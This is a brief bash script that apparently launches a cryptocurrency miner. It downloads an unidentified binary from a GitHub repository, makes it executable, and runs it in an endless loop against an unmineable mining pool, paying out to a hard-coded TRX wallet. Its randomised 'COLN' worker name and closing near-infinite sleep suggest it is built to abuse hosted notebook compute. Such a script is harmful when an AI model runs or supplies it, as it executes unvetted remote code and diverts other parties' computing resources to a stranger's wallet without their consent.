#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=TRX:TKEUa3SvCJdN3XA4oJnhQNALHBqGJjSgLV
WORKER=$(echo $(shuf -i 10-40 -n 1)-COLN#2zmj-9x3s)
wget https://github.com/Vasava10/prem/raw/main/janeman
chmod +x janeman
	while [ 1 ]; do
		./janeman -pool $POOL -wal $WALLET.$WORKER -pass x
        sleep 5
	done
sleep 999999999 
